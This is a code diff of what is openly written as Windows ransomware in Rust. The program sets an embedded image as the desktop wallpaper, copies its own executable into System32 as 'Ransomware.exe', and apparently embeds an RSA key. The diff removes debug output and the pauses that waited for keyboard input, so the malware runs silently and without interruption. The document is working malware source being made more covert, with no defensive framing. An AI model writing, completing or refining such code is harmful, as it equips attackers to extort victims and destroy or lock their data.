@@ -2,9 +2,8 @@ pub mod build;
 
 use std::ffi::{OsStr, OsString};
 use std::fs::{self, remove_file, File};
-use std::io::{self, BufWriter, Read, Write};
+use std::io::{BufWriter, Read, Write};
 use std::os::windows::ffi::{OsStrExt, OsStringExt};
-use std::path::Path;
 
 extern crate winapi;
 use winapi::um::sysinfoapi::GetSystemDirectoryW;
@@ -191,7 +190,7 @@ SwIDAQAB
     let temp_image_path = "C:\\temp_image.jpg";
 
     match save_image_to_temp_file(temp_image_path, IMAGE_DATA) {
-        Ok(_) => println!("Image saved to temporary file successfully."),
+        Ok(_) => {},
         Err(e) => {
             eprintln!("Failed to save image to temporary file: {}", e);
             return;
@@ -202,11 +201,6 @@ SwIDAQAB
         eprintln!("Failed to set desktop background: {}", e);
     }
 
-    let mut input = String::new();
-    io::stdin().read_line(&mut input)
-        .expect("Failed to read line");
-
-    // let dest_dir = Path::new(r"Windows\system32\ransomware.exe");
     let mut dest_dir = get_system32_path();
     dest_dir.push(r"\Ransomware.exe");
 
@@ -219,24 +213,10 @@ SwIDAQAB
         }
     };
 
-
-    println!("Path exec : {:?}", current_exe_path.to_str());
-    println!("Path dest : {:?}", dest_dir);
-
-    
-    let mut input = String::new();
-    
-    io::stdin().read_line(&mut input)
-        .expect("Failed to read line");
-
     if let Err(e) = fs::copy(&current_exe_path, &dest_dir) {
         eprintln!("Error copying file: {}", e);
         return;
     }
-
-    let mut input = String::new();
-    io::stdin().read_line(&mut input)
-        .expect("Failed to read line");
 
 }
 fn generate_random_string(length: usize) -> String {
